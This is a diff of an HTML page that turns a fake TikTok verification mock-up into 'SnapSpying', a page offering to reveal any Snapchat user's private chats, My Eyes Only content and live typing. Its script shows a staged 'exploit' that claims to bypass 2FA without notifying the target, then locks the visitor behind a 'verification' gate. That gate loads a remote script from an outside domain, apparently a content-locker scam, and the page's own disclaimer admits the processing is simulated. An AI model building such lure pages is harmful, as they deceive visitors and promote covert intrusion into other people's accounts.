@@ -3,351 +3,273 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Official Profile Clone</title>
-    <style>
-        /* Exact TikTok Font */
-        @import url('https://fonts.cdnfonts.com/css/sf-pro-display');
-
-        :root {
-            --tt-black: #010101;
-            --tt-grey: #16171a;
-            --tt-text-grey: #8a8b91;
-            --tt-pink: #fe2c55;
-            --tt-blue: #20d5ec;
-            --tt-border: #252525;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "SF Pro Display", -apple-system, sans-serif; }
-        
-        body { background-color: #1a1a1a; color: white; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; }
-
-        /* iPhone 14 Pro Frame */
-        .iphone-frame {
-            width: 393px;
-            height: 852px;
-            background: var(--tt-black);
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* 1. Status Bar */
-        .status-bar {
-            padding: 14px 28px 5px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 15px;
-            font-weight: 600;
-        }
-        .status-icons { display: flex; gap: 6px; align-items: center; }
-
-        /* 2. Top Nav */
-        .top-nav {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 18px;
-            align-items: center;
-        }
-        .top-nav svg { width: 26px; height: 26px; fill: white; }
-
-        /* 3. Profile Header */
-        .profile-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 10px;
-        }
-
-        .avatar-container {
-            position: relative;
-            width: 100px;
-            height: 100px;
-            margin-bottom: 12px;
-        }
-        .avatar-img {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 0.5px solid #333;
-        }
-        .add-badge {
-            position: absolute;
-            bottom: 2px;
-            right: 2px;
-            background: #00f2ea;
-            width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            border: 2px solid #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        .user-names { text-align: center; }
-        .d-name { 
-            font-size: 18px; 
-            font-weight: 700; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 4px; 
-        }
-        .u-handle { font-size: 14px; font-weight: 500; margin-top: 4px; display: block; }
-        
-        /* THE VERIFIED BADGE (Exact Blue) */
-        .v-badge {
-            color: var(--tt-blue);
-            font-size: 17px;
-            display: none;
-            animation: badgePop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        /* Stats Row */
-        .stats-row {
-            display: flex;
-            gap: 32px;
-            margin: 22px 0;
-        }
-        .stat-item { text-align: center; }
-        .stat-val { font-size: 18px; font-weight: 700; display: block; }
-        .stat-lbl { font-size: 13px; color: var(--tt-text-grey); margin-top: 1px; }
-
-        /* Action Row */
-        .btn-row { display: flex; gap: 6px; margin-bottom: 15px; }
-        .tt-btn {
-            background: #252525;
-            color: white;
-            padding: 8px 18px;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 600;
-        }
-
-        .bio {
-            font-size: 14px;
-            text-align: center;
-            padding: 0 45px;
-            line-height: 1.4;
-            color: white;
-            margin-bottom: 20px;
-        }
-
-        /* 4. Tabs Row */
-        .tabs-tray {
-            display: flex;
-            width: 100%;
-            justify-content: space-around;
-            border-top: 0.5px solid #222;
-            padding: 12px 0;
-            color: var(--tt-text-grey);
-        }
-        .tab-active { color: white; border-bottom: 2px solid white; padding-bottom: 10px; margin-bottom: -12px; }
-
-        /* 5. Placeholder Content */
-        .content-area {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 60px;
-            text-align: center;
-        }
-        .ai-icon { width: 64px; height: 64px; margin-bottom: 15px; opacity: 0.6; }
-        .create-pink {
-            background: var(--tt-pink);
-            color: white;
-            padding: 12px 60px;
-            border-radius: 4px;
-            font-weight: 700;
-            font-size: 16px;
-            margin-top: 25px;
-            border: none;
-        }
-
-        /* 6. BOTTOM TOOL (CONTROL) */
-        .verify-panel {
-            position: absolute;
-            bottom: 100px;
-            left: 5%;
-            width: 90%;
-            background: rgba(20, 20, 20, 0.95);
-            padding: 20px;
-            border-radius: 12px;
-            border: 1px solid #333;
-            z-index: 50;
-        }
-        .verify-panel input {
-            width: 100%; background: #000; border: 1px solid #444;
-            padding: 12px; color: white; border-radius: 6px; margin-bottom: 10px; outline: none;
-        }
-
-        /* Leading Overlay (Venix Tool Style) */
-        .venix-tool {
-            display: none;
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 330px;
-            background: #1c1c1c;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 25px;
-            text-align: center;
-            z-index: 100;
-            box-shadow: 0 0 40px rgba(0,0,0,0.8);
-        }
-        .venix-loader {
-            width: 45px; height: 45px;
-            border: 4px solid #333;
-            border-top: 4px solid var(--tt-blue);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 15px auto;
-        }
-
-        /* Bottom Nav Bar */
-        .bottom-nav {
-            height: 85px;
-            background: #000;
-            border-top: 0.5px solid #222;
-            display: flex;
-            justify-content: space-around;
-            padding-top: 8px;
-            color: var(--tt-text-grey);
-            font-size: 10px;
-        }
-        .nav-item { text-align: center; }
-        .nav-item i { font-size: 22px; display: block; margin-bottom: 4px; }
-
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes badgePop { from { transform: scale(0); } to { transform: scale(1.2); } }
-    </style>
+    <title>SnapSpying - Private Tool</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        :root { --bg: #000; --card: #1c1c1e; --text: #fff; --border: #2c2c2e; }
+        .light { --bg: #f2f2f7; --card: #fff; --text: #000; --border: #d1d1d6; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
+        .sheet.active { transform: translateY(0); }
+        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; box-shadow: 0 0 10px #ffd500; }
+        .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+        .action-item:active { transform: scale(0.97); background: #2c2c2e; }
+        .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; transition: border 0.3s; }
+        .input-error { border: 1px solid #ff3b30 !important; }
+        .privacy-card { background: #000; border: 1px solid #1c1c1e; border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; }
+        
+        /* Effect dyal l-preview */
+        #preview-img {
+            mask-image: linear-gradient(to bottom, black 80%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to bottom, black 80%, transparent 100%);
+        }
+    </style>
 </head>
-<body>
+<body class="flex flex-col items-center px-6 pt-4 min-h-screen">
 
-    <div class="iphone-frame">
-        <div class="venix-tool" id="venix">
-            <p style="font-size: 13px; color: #aaa;">Venix TikTok Verify Tool</p>
-            <h4 id="v-status" style="margin-top: 10px;">Processing verification...</h4>
-            <div class="venix-loader"></div>
-            <p id="v-pct" style="font-size: 24px; font-weight: 800;">0%</p>
+    <header class="w-full max-w-md flex justify-between items-center py-4 mb-6">
+        <h1 class="text-2xl font-bold tracking-tight">Snap<span class="text-[#ffd500]">Spying</span></h1>
+        <div class="flex items-center gap-6">
+            <button onclick="toggleSheet('privacy-sheet')" class="text-gray-500 font-medium text-sm">Privacy</button>
+            <button onclick="document.body.classList.toggle('light')"><i class="fas fa-sun text-gray-500 text-xl"></i></button>
+        </div>
+    </header>
+
+    <div class="w-full max-w-md">
+        <p class="text-[15px] font-medium mb-3">Enter the username you want to check</p>
+        <div class="flex gap-2 mb-2">
+            <input type="text" id="username" placeholder="Username" class="input-box flex-1 rounded-2xl px-4 py-4 outline-none text-sm text-white">
+            <button onclick="handleConnect()" id="connBtn" class="bg-[#2c2c2e] text-white px-7 rounded-2xl font-bold text-sm transition">Connect</button>
+        </div>
+        <p id="error-msg" class="hidden text-[#ff3b30] text-[12px] mb-4 font-semibold italic">Username must be between 4 and 15 characters</p>
+        
+        <div id="conn-status" class="hidden mb-6 flex items-center gap-2">
+            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+            <span class="text-[12px] font-bold text-green-500">Connected to <span id="targetName"></span></span>
         </div>
 
-        <div class="status-bar">
-            <span>10:24</span>
-            <div class="status-icons">
-                <i class="fas fa-plane"></i>
-                <i class="fas fa-wifi"></i>
-                <i class="fas fa-battery-three-quarters" style="color: #fce100;"></i>
-            </div>
-        </div>
-
-        <div class="top-nav">
-            <i class="fas fa-user-plus"></i>
-            <span style="font-weight: 700; font-size: 16px;">Profile</span>
-            <i class="fas fa-bars"></i>
-        </div>
-
-        <div class="profile-section">
-            <div class="avatar-container">
-                <img src="https://via.placeholder.com/150" class="avatar-img" id="p-img">
-                <div class="add-badge">+</div>
-            </div>
-            <div class="user-names">
-                <div class="d-name">
-                    <span id="p-name">Jessica</span>
-                    <i class="fas fa-check-circle v-badge" id="badge"></i>
+        <div id="actions-grid" class="opacity-40 pointer-events-none transition-opacity duration-700 space-y-3">
+            <div onclick="openAction('Live Typing', '582,393', 'Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-keyboard text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Live Typing</h3><p class="text-[11px] text-gray-500">See what your friend is typing in real-time</p></div>
                 </div>
-                <span class="u-handle" id="p-handle">@snaptrickspro</span>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div class="stats-row">
-                <div class="stat-item"><span class="stat-val">26</span><span class="stat-lbl">Following</span></div>
-                <div class="stat-item"><span class="stat-val">2</span><span class="stat-lbl">Followers</span></div>
-                <div class="stat-item"><span class="stat-num">14</span><span class="stat-lbl">Likes</span></div>
+            <div onclick="openAction('Best Friends', '1,042,100', '8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-user-group text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
+                </div>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div class="btn-row">
-                <div class="tt-btn">Edit profile</div>
-                <div class="tt-btn">Add friends</div>
+            <div onclick="openAction('Eyes Only', '94,204', 'Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-eye text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content of any user</p></div>
+                </div>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div class="bio">
-                Expert tutorials for Snapchat tips and security.<br>Follow for more!
+            <div onclick="openAction('Chat History', '215,902', 'Message history of any user, including sent, received, opened, and saved chats', 'chat')" class="action-item p-5 flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500 leading-tight">Message history including sent, received...</p></div>
+                </div>
+                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
-        </div>
-
-        <div class="tabs-tray">
-            <i class="fas fa-grip-lines tab-active"></i>
-            <i class="fas fa-lock"></i>
-            <i class="fas fa-retweet"></i>
-            <i class="fas fa-bookmark"></i>
-            <i class="far fa-heart"></i>
-        </div>
-
-        <div class="content-area">
-            <div class="ai-icon">
-                <svg viewBox="0 0 48 48" fill="#333"><path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4zm0 36c-8.82 0-16-7.18-16-16S15.18 8 24 8s16 7.18 16 16-7.18 16-16 16z"/></svg>
-            </div>
-            <h3 style="font-size: 16px;">Create your AI Self</h3>
-            <p style="font-size: 13px; color: var(--tt-text-grey); margin-top: 6px;">Videos your AI Self is cast in will appear here.</p>
-            <button class="create-pink">Create</button>
-        </div>
-
-        <div class="verify-panel" id="panel">
-            <input type="text" id="in-name" placeholder="Display Name (e.g. Jessica)">
-            <input type="text" id="in-user" placeholder="Username (e.g. @snaptrickspro)">
-            <button class="create-pink" style="width:100%; margin:0;" onclick="verifyAccount()">Verify Official Account</button>
-        </div>
-
-        <div class="bottom-nav">
-            <div class="nav-item"><i class="fas fa-home"></i>Home</div>
-            <div class="nav-item"><i class="fas fa-users"></i>Friends</div>
-            <div class="nav-item"><i class="fas fa-plus-square" style="font-size: 32px; color: white; margin-top: -5px;"></i></div>
-            <div class="nav-item"><i class="fas fa-comment-dots"></i>Inbox</div>
-            <div class="nav-item" style="color: white;"><i class="fas fa-user"></i>Profile</div>
         </div>
     </div>
 
+    <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
+        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[90vh] overflow-y-auto flex flex-col">
+            <div class="flex justify-between items-center px-6 py-5 sticky top-0 bg-[var(--card)] z-10 border-b border-white/5">
+                <h2 class="text-[18px] font-bold">SnapSpying Privacy Policy</h2>
+                <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="px-6 py-6">
+                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 28, 2026</p>
+                <p class="text-white text-[14px] leading-relaxed mb-6">This Privacy Policy describes how your personal information is collected, used, and shared when you visit SnapSpying (the "Platform").</p>
+                
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Information We Collect</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only and does not collect or store any personal information. Any usernames or information input into the platform are not stored, tracked, or transmitted to external servers.</p>
+                </div>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">How We Use Your Information</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying does not collect or store any personal information, therefore we do not use it for any purpose. The platform simulates processing but does not perform any actual data retrieval or analysis.</p>
+                </div>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Data Security</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying prioritizes user privacy and security. We implement industry-standard security measures to protect any interaction with our platform.</p>
+                </div>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Cookies and Tracking</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying does not use cookies or any tracking technologies to collect information about visitors.</p>
+                </div>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Updates to Privacy Policy</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">We may update this privacy policy periodically to reflect changes in our practices or for operational, legal, or regulatory reasons.</p>
+                </div>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Contact Information</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">For questions about our privacy practices or to submit a privacy-related request, please contact the SnapSpying support team.</p>
+                </div>
+                <div class="bg-white/5 p-4 rounded-xl text-[10px] text-gray-500 italic mt-6 border border-white/5">
+                    Disclaimer: SnapSpying is an entertainment platform. This is a simulation for entertainment purposes only.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-6 sheet text-center">
+            <div class="w-10 h-1 bg-gray-700 mx-auto mb-6 rounded-full"></div>
+            
+            <div id="preview-container" class="w-full mb-6 overflow-hidden rounded-2xl bg-black/20">
+                <img id="preview-img" src="" alt="preview" class="w-full h-auto object-cover opacity-90">
+            </div>
+
+            <h3 id="r-count" class="text-3xl font-bold mb-1">0</h3>
+            <p class="text-[10px] text-gray-500 uppercase font-black mb-8">Viewed 100+ times</p>
+            
+            <h4 id="r-title" class="text-[17px] font-bold mb-8 px-4 leading-tight"></h4>
+            <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg active:scale-95 transition-transform">Reveal</button>
+        </div>
+    </div>
+
+    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
+        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5">
+            <div class="flex items-center gap-2 mb-8">
+                <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
+                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Processing</span>
+                <span id="p-percent" class="ml-auto text-[#ffd500] font-bold">0%</span>
+            </div>
+            <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing exploit...</h2>
+            <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
+            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing 2FA Authentication...</p>
+        </div>
+    </div>
+
+    <div id="verify-modal" class="hidden fixed inset-0 z-[400] bg-[#000] flex flex-col items-center justify-center p-8 text-center overflow-y-auto">
+        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20">
+            <i class="fas fa-lock text-[#ffd500] text-4xl"></i>
+        </div>
+        <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
+        <p class="text-gray-500 text-sm mb-12">Please complete the security check to continue</p>
+        
+        <div class="w-full max-w-sm">
+            <div data-captcha-enable="true"></div>
+        </div>
+
+        <p class="text-[10px] text-gray-700 mt-12 font-bold flex items-center gap-2">
+            <i class="fas fa-info-circle"></i> This confirms you're human and protects the system
+        </p>
+    </div>
+
     <script>
-        function verifyAccount() {
-            const name = document.getElementById('in-name').value || "Jessica";
-            const user = document.getElementById('in-user').value || "@snaptrickspro";
+        function toggleSheet(id) {
+            const el = document.getElementById(id);
+            el.classList.toggle('hidden');
+            setTimeout(() => el.querySelector('.sheet').classList.toggle('active'), 10);
+        }
 
-            document.getElementById('p-name').innerText = name;
-            document.getElementById('p-handle').innerText = user.startsWith('@') ? user : '@' + user;
+        function handleConnect() {
+            const user = document.getElementById('username').value;
+            const btn = document.getElementById('connBtn');
+            const inp = document.getElementById('username');
+            const err = document.getElementById('error-msg');
+            
+            if(user.length < 4) {
+                inp.classList.add('input-error');
+                err.classList.remove('hidden');
+                return;
+            }
+            
+            if(btn.innerText === "Disconnect") { location.reload(); return; }
 
-            document.getElementById('panel').style.display = 'none';
-            document.getElementById('venix').style.display = 'block';
+            inp.classList.remove('input-error');
+            err.classList.add('hidden');
+            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
+            btn.disabled = true;
 
-            let progress = 0;
-            const pct = document.getElementById('v-pct');
-            const status = document.getElementById('v-status');
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerText = "Disconnect";
+                btn.classList.replace('bg-[#2c2c2e]', 'bg-[#ff3b30]');
+                document.getElementById('conn-status').classList.remove('hidden');
+                document.getElementById('targetName').innerText = '@' + user;
+                document.getElementById('actions-grid').classList.replace('opacity-40', 'opacity-100');
+                document.getElementById('actions-grid').style.pointerEvents = 'auto';
+            }, 1500);
+        }
 
-            const interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 5) + 2;
-                if(progress > 100) progress = 100;
+        function openAction(title, count, desc, type) {
+            const previewImg = document.getElementById('preview-img');
+            
+            // Hna t-ghplaci l-links dyal tsawer li mdebebin (Direct Links)
+            const images = {
+                'typing': 'https://i.postimg.cc/9F7V2V0M/typing.png',
+                'friends': 'https://i.postimg.cc/qR8Xk4kG/friends.png',
+                'eyes': 'https://i.postimg.cc/6qNqYVz8/eyes.png',
+                'chat': 'https://i.postimg.cc/mD3mXz0m/chat.png'
+            };
+
+            previewImg.src = images[type] || '';
+            document.getElementById('r-title').innerText = desc;
+            document.getElementById('r-count').innerText = count;
+            toggleSheet('action-sheet');
+        }
+
+        function closeActionSheet() { toggleSheet('action-sheet'); }
+
+        function runExploit() {
+            closeActionSheet();
+            setTimeout(() => {
+                document.getElementById('proc-modal').classList.remove('hidden');
+                let p = 0;
+                const bar = document.getElementById('bar');
+                const percent = document.getElementById('p-percent');
+                const status = document.getElementById('p-status');
+                const log = document.getElementById('p-log');
                 
-                pct.innerText = progress + "%";
-                
-                if(progress === 100) {
-                    clearInterval(interval);
-                    status.innerText = "Successfully verified!";
-                    setTimeout(() => {
-                        document.getElementById('venix').style.display = 'none';
-                        document.getElementById('badge').style.display = 'inline-block';
-                    }, 1200);
-                }
-            }, 80);
+                const steps = [
+                    {p: 25, s: 'Bypassing 2FA Authentication', l: 'Initializing SnapSpying exploit...'},
+                    {p: 50, s: '2FA Authentication successfully bypassed', l: 'Bypassing 2FA Authentication...'},
+                    {p: 75, s: 'Compiling display', l: 'Compiling display...'},
+                    {p: 100, s: 'Success - user will not be notified', l: 'Finalizing verification protocol...'}
+                ];
+
+                let stepIdx = 0;
+                const interval = setInterval(() => {
+                    p += 1;
+                    bar.style.width = p + '%';
+                    percent.innerText = p + '%';
+                    
+                    if(p >= steps[stepIdx].p) {
+                        status.innerText = steps[stepIdx].s;
+                        log.innerText = steps[stepIdx].l;
+                        stepIdx = Math.min(stepIdx + 1, steps.length - 1);
+                    }
+
+                    if(p >= 100) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            document.getElementById('proc-modal').classList.add('hidden');
+                            document.getElementById('verify-modal').classList.remove('hidden');
+                        }, 800);
+                    }
+                }, 40);
+            }, 400);
         }
     </script>
+
+    <script type="text/javascript" src="https://authenticateapp.online/cp/js/2wx2k"></script>
 </body>
 </html>
